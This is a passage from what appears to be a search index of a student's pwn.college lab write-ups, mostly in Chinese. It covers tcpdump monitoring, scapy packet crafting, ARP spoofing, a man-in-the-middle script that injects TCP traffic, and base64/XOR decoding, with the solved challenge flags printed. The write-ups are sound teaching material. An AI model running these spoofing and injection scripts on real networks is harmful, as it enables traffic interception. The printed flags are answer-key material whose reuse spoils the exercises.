c962 0000 0101 080a f556 8073 .....b.......V.s 0x0030: 4715 d4dd 65 G...e 01:32:15.541382 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1 0x0000: 4500 0035 9487 4000 4006 9237 0a00 0002 E..5..@.@..7.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c ....zi.j........ 0x0020: 8018 01fe bf8e 0000 0101 080a f556 845c .............V.\\ 0x0030: 4715 d8c6 67 G...g 01:32:16.542597 eth0 Out IP 10.0.0.2.31337 > 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1 0x0000: 4500 0035 9488 4000 4006 9236 0a00 0002 E..5..@.@..6.... 0x0010: 0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d ....zi.j........ 0x0020: 8018 01fe b9ba 0000 0101 080a f556 8845 .............V.E 0x0030: 4715 dcaf 65 G...e \u6211\u4eec\u5c31\u628a\u6700\u540e\u4e00\u4f4d\u62fc\u8d77\u6765\u5c31\u884c\u4e86\uff0c\u53cd\u6b63\u8fd9\u4e00\u6b65\u5927\u6982\u6709\u70b9\u513f\u70e6\uff0c\u53ef\u4ee5\u5199\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u624b\u52a8\u590d\u5236:( # \u597d\u5427\uff0c\u6211\u811a\u672c\u6ca1\u5199\u5bf9\uff0c\u81ea\u5df1\u624b\u52a8\u590d\u5236\u7684\uff0c\u5c3c\u739b pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW}","title":"level6 Monitor slow traffic from a remote host"},{"location":"en/CSE365/Intercepting%20Communication/#level7-hijack-traffic-from-a-remote-host-by-configuring-your-network-interface","text":"tcpdump -i any # \u53d1\u73b010.0.0.4\u4e00\u76f4\u5728\u53d1\u9001\u8bf7\u6c42\u3002\u8fd9\u65f6\u5019\u6211\u9a97\u5b83\u5e94\u8be5\u5c31\u884c\u4e86\u3002 ip addr add 10.0.0.2/8 dev eth0 \u7136\u540e\u53d1\u73b0\u4e86\u8fd9\u4e9b\u5305 listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes 15:07:21.562729 eth0 B ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28 15:07:21.562752 eth0 Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28 15:07:21.562833 eth0 In IP 10.0.0.4.37984 > 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0 15:07:21.562843 eth0 Out IP 10.0.0.2.31337 > 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0 15:07:21.639815 lo In IP localhost.53883 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639846 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.639911 lo In IP localhost.39242 > 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39) 15:07:21.639923 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640042 lo In IP localhost.46035 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) 15:07:21.640052 lo In IP 127.0.0.11 > localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75 15:07:21.640103 lo In IP localhost.50224 > 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39) \u8fd9\u4e2aR\u8bf4\u660ereset\u4f4d\uff1a\u200b\u200b\u200b\u200b\u200b\u200b \u8868\u793aTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u5f02\u5e38\u5fc5\u987b\u5f3a\u5236\u65ad\u5f00\u8fde\u63a5\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u7aef\u53e3\u5373\u4f7f\u53d1\u6765\u4e86\u8fde\u63a5\u8bf7\u6c42\uff0c\u4e5f\u65e0\u6cd5\u901a\u4fe1\u3002 \u7136\u540e\u76d1\u542c\u5373\u53ef nc -l 31337 \u8fd9\u9898\u770b\u4e86\u8bb2\u89e3\u624d\u4f1a\uff0c\u5c31\u5361\u5728\u4e0d\u77e5\u9053\u600e\u4e48\u770b\u8fd9\u4e2a\u6807\u5fd7\u4f4d\u4e0a\uff0c\u679c\u7136\u77e5\u8bc6\u5904\u5904\u662f\u76f2\u533a \u7136\u540e\u5728\u4f60\u76d1\u542c\u4ee5\u540e\uff0c\u5c31\u4f1a\u53d8\u6210PUSH\u6807\u5fd7\u4f4d\u3002 ///@TODO: \u5173\u4e8e\u540e\u9762\u7684\u53d1\u5305\uff0c\u6211\u6240\u6709ARP\u5565\u7684\u57fa\u672c\u4e0a\u90fd\u662f\u53d1\u9001\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u8bb2\u89e3\u4e4b\u4e2d\u53d1\u9001\u7ed9\u7279\u5b9a\u5730\u5740\uff0c\u6ca1\u6709\u5fc5\u8981\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u6709\u7684\u5173\u5361\u4f4f\uff0c\u5982\u679c\u53d1\u9001\u7ed9\u7279\u5b9a\u7684\u7269\u7406\u7f51\u5361\uff0c\u6211\u6bcf\u6b21\u91cd\u5f00\u6311\u6218\u90fd\u8981\u91cd\u65b0\u67e5\u770b\uff0c\u6709\u70b9\u513f\u9ebb\u70e6\u3002","title":"level7 Hijack traffic from a remote host by configuring your network interface"},{"location":"en/CSE365/Intercepting%20Communication/#level8-manually-send-an-ethernet-packet","text":"\u4e3b\u8981\u662f\u4f7f\u7528scapy >>> sendp(Ether(src=\"4a:b3:c7:c5:08:7d\",dst=\"ff:ff:ff:ff:ff:ff\",type=0xFFFF),iface=\"eth0\") . Sent 1 packets. pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW}","title":"level8 Manually send an Ethernet packet"},{"location":"en/CSE365/Intercepting%20Communication/#level9-manually-send-an-internet-protocol-packet","text":"\u53d1IP\u4e86 >>> sendp(Ether(src=\"52:bc:a3:08:14:d1\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(proto=0xFF, src=\"127.0.0.1\",dst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW}","title":"level9 Manually send an Internet Protocol packet"},{"location":"en/CSE365/Intercepting%20Communication/#level10-manually-send-a-transmission-control-protocol-packet","text":">>> sendp(Ether(src=\"12:af:41:92:01:6f\",dst=\"ff:ff:ff:ff:ff:ff\", type=0x0800) / IP(src=\"127.0.0.1\", dst=\"10.0.0.3\", proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=\"APRSF\"), ...: iface=\"eth0\") . Sent 1 packets. pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW}","title":"level10 Manually send a Transmission Control Protocol packet"},{"location":"en/CSE365/Intercepting%20Communication/#level11-manually-perform-a-transmission-control-protocol-handshake","text":"sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"S\"),iface=\"eth0\") sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=\"A\"),iface=\"eth0\") pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW} \u591a\u4e48\u7f8e\u5999\u7684\u4e00\u5f20\u56fe","title":"level11 Manually perform a Transmission Control Protocol handshake"},{"location":"en/CSE365/Intercepting%20Communication/#level12-manually-send-an-address-resolution-protocol-packet","text":">>> sendp(Ether(dst=\"ff:ff:ff:ff:ff:ff\", src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\", hwsrc=get_if_h ...: waddr(\"eth0\"), psrc=\"10.0.0.2\", hwdst=\"ff:ff:ff:ff:ff:ff\", pdst=\"10.0.0.3\"), iface=\"eth0\") . Sent 1 packets. pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW}","title":"level12 Manually send an Address Resolution Protocol packet"},{"location":"en/CSE365/Intercepting%20Communication/#level13-hijack-traffic-from-a-remote-host-using-arp","text":"\u5148\u89c2\u5bdf\u4e00\u6ce2 root@ip-10-0-0-3:~# ip a 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.3/16 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::e419:83ff:fe95:20c7/64 scope link valid_lft forever preferred_lft forever root@ip-10-0-0-3:~# \u5f88\u5c2c\uff0c\u5c31\u81ea\u5df1\u778e\u505a\u628a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.4\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=\"e6:19:83:95:20:c7\") / IP(src=\"10.0.0.4\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=\"e6:19:83:95:20:c7\", psrc=\"10.0.0.3\", pdst=\"10.0.0.2\") remote_mac = arp_response[0][1].hwsrc tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31338, dport=31337, flags=\"PA\", seq=123456, ack=0) \u770b\u8d77\u6765\uff0c\u53c8\u662f\u5efa\u7acb\u94fe\u63a5\uff1f sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ff:ff:ff:ff:ff:ff\") / IP(src=\"10.0.0.2\", dst=\"10.0.0.3\") / TCP(sport=31337, dport=31337, seq=31337, flags=\"A\"),iface=\"eth0\") \u8fc7\u7a0b\u90fd\u5199\u5b8c\u4e86\uff0c\u53ef\u4ee5\u5199\u811a\u672c\u4e86 from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.4\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.4\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") from scapy.all import * # \u83b7\u53d6\u672c\u5730\u63a5\u53e3\u7684 MAC \u548c IP \u5730\u5740 local_mac = get_if_hwaddr(\"eth0\") local_ip = get_if_addr(\"eth0\") # \u6784\u9020 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u6b3a\u9a97\u76ee\u6807\u4e3b\u673a arp_request = Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(op=\"who-has\", hwsrc=local_mac, psrc=local_ip, pdst=\"10.0.0.2\") # \u53d1\u9001 ARP \u8bf7\u6c42\u6570\u636e\u5305\uff0c\u5e76\u83b7\u53d6\u76ee\u6807\u4e3b\u673a\u7684 MAC \u5730\u5740 arp_response = srp(arp_request, timeout=2, iface=\"eth0\", verbose=False)[0] remote_mac = arp_response[0][1].hwsrc # \u6784\u9020 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u5c06\u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e3b\u673a tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=\"10.0.0.2\", dst=local_ip) / TCP(sport=31337, dport=31337, flags=\"PA\", seq=123456, ack=0) # \u53d1\u9001 TCP \u91cd\u5b9a\u5411\u6570\u636e\u5305\uff0c\u52ab\u6301\u6d41\u91cf sendp(tcp_redirect, iface=\"eth0\") \u597d\u5427\uff0c\u6574\u4e86\u4e00\u5927\u5806\uff0c\u7136\u540e\u53d1\u73b0\u641e\u9519\u4e86\uff0c\u6ca1\u90a3\u4e48\u590d\u6742\uff0cG\u3002\u3002\u3002 \u6b63\u786e\u89e3\u7b54\u5982\u4e0b\uff1a root@ip-10-0-0-3:~# arping 10.0.0.4 ARPING 10.0.0.4 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec 42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec ^C --- 10.0.0.4 statistics --- 2 packets transmitted, 2 packets received, 0% unanswered (0 extra) rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms root@ip-10-0-0-3:~# sendp(Ether(src=get_if_hwaddr(\"eth0\"),dst=\"ce:b6:65:76:0a:83\") / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"),psrc=\"10.0.0.2\",hwdst=\"ce:b6:65:76:0a:83\",pdst=\"10.0.0.4\"),iface=\"eth0\") pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW}","title":"level13 Hijack traffic from a remote host using ARP"},{"location":"en/CSE365/Intercepting%20Communication/#level14-man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic","text":"\u4ece\u8bb2\u89e3\u6765\u770b\uff0c\u8fd9\u4e2a\u9898\u7684\u6838\u5fc3\u662f\u9700\u8981\u52a0\u5165\u5bf9\u8bdd\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u76d1\u542c\uff0c\u56e0\u4e3a\u5bf9\u8bdd\u4e2d\u6709\u4e00\u6b21\u6027\u5bc6\u94a5\uff0c\u4ec5\u4ec5\u76d1\u542c\u5e76\u4e0d\u7ba1\u7528\uff0c\u91cd\u70b9\u662f\u6293\u4f4f\u7a97\u53e3\u671f\u53d1\u9001\u5305\u542b\u6709FLAG\u7684\u5305\u3002 \u76f4\u63a5\u5199\u4e2a\u811a\u672c from scapy.all import * sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.3\",pdst=\"10.0.0.4\"),iface=\"eth0\") #tell 10.0.0.4\uff0cwhere 10.0.0.3 it is sendp(Ether(src=get_if_hwaddr(\"eth0\")) / ARP(op=\"is-at\",hwsrc=get_if_hwaddr(\"eth0\"), psrc=\"10.0.0.4\",pdst=\"10.0.0.3\"),iface=\"eth0\") #tell 10.0.0.3\uff0cwhere 10.0.0.4 it is packet_data = { 'key': '', 'dst': '', 'src': '', 'ipdst': '', 'ipsrc': '', 'ipflags': '', 'sport': 0, 'dport': 31337, 'flags': '', 'seq': 0, 'ack': 0 } def CallBack(packet): if packet.haslayer('TCP'): tcp = packet['TCP'] ip = packet['IP'] ether = packet['Ethernet'] load = tcp.load if hasattr(tcp, 'load') else b'' if ip.src == '10.0.0.4' and load != b'ECHO\\n': packet_data['key'] = load if ip.src == '10.0.0.3' and load == b'COMMANDS:\\nECHO\\nFLAG\\nCOMMAND:\\n': print(\"WARNING!!\") packet_data.update({ 'ipdst': ip.src, 'ipsrc': ip.dst, 'flags': 'PA', 'ipflags': ip.flags, 'dst': ether.src, 'src': ether.dst, 'dport': tcp.sport, 'sport': tcp.dport, 'seq': tcp.ack, 'ack': tcp.seq + 29 }) raw_pkt = Raw(load='FLAG\\n') (Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt).display() sendp(Ether(src=packet_data['src'], dst=packet_data['dst']) / IP(src=packet_data['ipsrc'], dst=packet_data['ipdst'], flags=packet_data['ipflags']) / TCP(dport=packet_data['dport'], sport=packet_data['sport'], seq=packet_data['seq'], ack=packet_data['ack'], flags=packet_data['flags']) / raw_pkt, iface=\"eth0\") sniff(filter=\"tcp\", prn=CallBack, iface='eth0', count=100) \u7136\u540e\u987a\u5229\u62ff\u5230flag pwn.college{A3pb7kfH8On2sOV2_hSlPGWG_P8.dJzNzMDL2QjMyMzW} \u53ef\u4ee5\u770b\u8fd9\u4e2a \u89c6\u9891\u8bb2\u89e3 \u788e\u788e\u5ff5\uff1a\u8fd9\u4e2a\u90e8\u5206\u5176\u5b9e\u4e0d\u592a\u96be\uff0c\u91cd\u70b9\u662f\u5b66\u4f1ascapy\u5373\u53ef\uff0c\u4f46\u662f\u8be1\u5f02\u7684\u5730\u65b9\u5728\u4e8e\u5fc5\u987b\u4f7f\u7528tmux\uff0c\u597d\u50cf\u8fd9\u6837\u624d\u80fd\u5728\u4e00\u4e2a\u7236\u7ebf\u7a0b\u4e4b\u4e0b\uff0c\u4e0d\u7136\u4f60\u5728\u53e6\u4e00\u4e2ashell\u91cc\u9762\u4f7f\u7528python\u811a\u672c\uff0c\u8fd9\u4e2ashell\u91cc\u9762\u7684tcpdump\u6293\u4e0d\u5230\u4e1c\u897f\u3002\u8fd9\u66fe\u7ecf\u56f0\u6270\u4e86\u6211\u5f88\u4e45\uff0c\u522b\u7684\u5c31\u6ca1\u5565\u4e86\u3002","title":"level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic"},{"location":"en/CSE365/cryptograph/","text":"level1 \u76f4\u63a5\u4f7f\u7528python\u5185\u7f6e\u7684base64\u6a21\u5757\u8fdb\u884c\u89e3\u7801\u3002 import base64 # Base64-encoded string base64_string = \"cHduLmNvbGxlZ2V7Z0dBNWR1UjdUVnJmYno5d0lweThmS1VnS1FrLmROek56TURMMlFqTXlNeld9Cg==\" # Decode the string to bytes base64_bytes = base64_string.encode('ascii') message_bytes = base64.b64decode(base64_bytes) # Decode the bytes to UTF-8 string message = message_bytes.decode('utf-8') print(message) ref Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u6253\u5370ASCII\u5b57\u7b26\u683c\u5f0f\u7684\u65b9\u6cd5\u3002\u8be5\u7b97\u6cd5\u57fa\u4e8e64\u4e2a\u4e0d\u540c\u5b57\u7b26\u7684\u5b50\u96c6\uff0c\u7531\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u52a0\u53f7\u548c\u6b63\u659c\u6760\u7ec4\u6210\u3002 Base64\u7f16\u7801\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06\u8f93\u5165\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf6\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a6\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684Base64\u5b57\u7b26 \u5982\u679c\u5269\u4f59\u6bd4\u7279\u6570\u4e0d\u8db36\u6bd4\u7279\uff0c\u5219\u4f7f\u7528\u7b49\u53f7\uff08 = \uff09\u8865\u9f50\u3002 \u4f8b\u5982\uff0c\u5c06ASCII\u5b57\u7b26 Man \u8fdb\u884cBase64\u7f16\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a ASCII\u5b57\u7b26\uff1a M a n ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 Base64\u5b57\u7b26\uff1a S m F u \u56e0\u6b64\uff0c Man \u7684Base64\u7f16\u7801\u4e3a SmFu \u3002 Base64\u89e3\u7801\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06Base64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u636e \u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf8\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a8\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ASCII\u5b57\u7b26 \u4f8b\u5982\uff0c\u5c06 SmFu \u8fdb\u884cBase64\u89e3\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a Base64\u5b57\u7b26\uff1a S m F u 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 ASCII\u5b57\u7b26\uff1a M a n \u56e0\u6b64\uff0c SmFu \u7684Base64\u89e3\u7801\u4e3a Man \u3002 Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5e38\u7528\u7684\u6280\u672f\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f20\u8f93\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u901a\u8fc7\u7f16\u7801\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u53ef\u4ee5\u786e\u4fdd\u5b83\u4eec\u4f20\u8f93\u65f6\u907f\u514d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\u6216\u4e0d\u53d7\u652f\u6301\u7684\u683c\u5f0f\u3002 level2 import base64 key_str = \"xMQGl4LY1hyH7Khz155o3MedyLAedmm3H56HBvCvQHlzUkuTklt4ejKly8iRul/MH0kTNBGYpPGK3Q==\" ciphertext_str = \"tLNoueG3unDii80I4/YptLXTj+NPJz7SZc7PWajGIREGIXvQ5ygwVFb3sYbr9xuALRh5eWjV3qb31w==\" # \u89e3\u7801\u5bc6\u94a5\u548c\u5bc6\u6587 key = base64.b64decode(key_str) ciphertext = base64.b64decode(ciphertext_str) # \u5bf9\u5bc6\u6587\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c plaintext = bytearray(len(ciphertext)) for i in range(len(ciphertext)): plaintext[i] = ciphertext[i] ^ key[i % len(key)] # \u5c06\u83b7\u5f97\u7684\u5b57\u8282\u5e8f\u5217\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 original_text = plaintext.decode('utf-8') print(original_text)","title":"level1"},{"location":"en/CSE365/cryptograph/#level1","text":"\u76f4\u63a5\u4f7f\u7528python\u5185\u7f6e\u7684base64\u6a21\u5757\u8fdb\u884c\u89e3\u7801\u3002 import base64 # Base64-encoded string base64_string = \"cHduLmNvbGxlZ2V7Z0dBNWR1UjdUVnJmYno5d0lweThmS1VnS1FrLmROek56TURMMlFqTXlNeld9Cg==\" # Decode the string to bytes base64_bytes = base64_string.encode('ascii') message_bytes = base64.b64decode(base64_bytes) # Decode the bytes to UTF-8 string message = message_bytes.decode('utf-8') print(message)","title":"level1"},{"location":"en/CSE365/cryptograph/#ref","text":"Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u8f6c\u6362\u4e3a\u53ef\u6253\u5370ASCII\u5b57\u7b26\u683c\u5f0f\u7684\u65b9\u6cd5\u3002\u8be5\u7b97\u6cd5\u57fa\u4e8e64\u4e2a\u4e0d\u540c\u5b57\u7b26\u7684\u5b50\u96c6\uff0c\u7531\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u52a0\u53f7\u548c\u6b63\u659c\u6760\u7ec4\u6210\u3002 Base64\u7f16\u7801\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06\u8f93\u5165\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf6\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a6\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684Base64\u5b57\u7b26 \u5982\u679c\u5269\u4f59\u6bd4\u7279\u6570\u4e0d\u8db36\u6bd4\u7279\uff0c\u5219\u4f7f\u7528\u7b49\u53f7\uff08 = \uff09\u8865\u9f50\u3002 \u4f8b\u5982\uff0c\u5c06ASCII\u5b57\u7b26 Man \u8fdb\u884cBase64\u7f16\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a ASCII\u5b57\u7b26\uff1a M a n ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 Base64\u5b57\u7b26\uff1a S m F u \u56e0\u6b64\uff0c Man \u7684Base64\u7f16\u7801\u4e3a SmFu \u3002 Base64\u89e3\u7801\u8fc7\u7a0b\u5982\u4e0b\uff1a \u5c06Base64\u7f16\u7801\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6570\u636e \u5c06\u4e8c\u8fdb\u5236\u6570\u636e\u6309\u6bcf8\u4e2a\u6bd4\u7279\u8fdb\u884c\u5206\u7ec4 \u5c06\u6bcf\u4e2a8\u6bd4\u7279\u7ec4\u8f6c\u6362\u4e3a\u76f8\u5e94\u7684ASCII\u5b57\u7b26 \u4f8b\u5982\uff0c\u5c06 SmFu \u8fdb\u884cBase64\u89e3\u7801\uff0c\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\uff1a Base64\u5b57\u7b26\uff1a S m F u 6\u6bd4\u7279\u5206\u7ec4\uff1a 010011 010110 000101 101110 ASCII\u7801\uff08\u4e8c\u8fdb\u5236\uff09 01001101 01100001 01101110 ASCII\u5b57\u7b26\uff1a M a n \u56e0\u6b64\uff0c SmFu \u7684Base64\u89e3\u7801\u4e3a Man \u3002 Base64\u7f16\u7801\u548c\u89e3\u7801\u662f\u4e00\u79cd\u5e38\u7528\u7684\u6280\u672f\uff0c\u7528\u4e8e\u5728\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f20\u8f93\u4e8c\u8fdb\u5236\u6570\u636e\u3002\u901a\u8fc7\u7f16\u7801\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u53ef\u4ee5\u786e\u4fdd\u5b83\u4eec\u4f20\u8f93\u65f6\u907f\u514d\u51fa\u73b0\u7279\u6b8a\u5b57\u7b26\u6216\u4e0d\u53d7\u652f\u6301\u7684\u683c\u5f0f\u3002","title":"ref"},{"location":"en/CSE365/cryptograph/#level2","text":"import base64 key_str = \"xMQGl4LY1hyH7Khz155o3MedyLAedmm3H56HBvCvQHlzUkuTklt4ejKly8iRul/MH0kTNBGYpPGK3Q==\" ciphertext_str = \"tLNoueG3unDii80I4/YptLXTj+NPJz7SZc7PWajGIREGIXvQ5ygwVFb3sYbr9xuALRh5eWjV3qb31w==\" # \u89e3\u7801\u5bc6\u94a5\u548c\u5bc6\u6587 key = base64.b64decode(key_str) ciphertext = base64.b64decode(ciphertext_str) # \u5bf9\u5bc6\u6587\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c plaintext = bytearray(len(ciphertext)) for i in range(len(ciphertext)): plaintext[i] = ciphertext[i] ^ key[i % len(key)] # \u5c06\u83b7\u5f97\u7684\u5b57\u8282\u5e8f\u5217\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32 original_text = plaintext.decode('utf-8') print(original_text)","title":"level2"},{"location":"en/CSE365/talking-web/","text":"knoeledge \u91cd\u70b9\u662fhttp \u8bf7\u6c42\u62a5\u6587\uff0c\u8fd9\u90e8\u5206\u4e0d\u592a\u6d89\u53ca\u54cd\u5e94\u62a5\u6587 \u4e00\u4e2a http 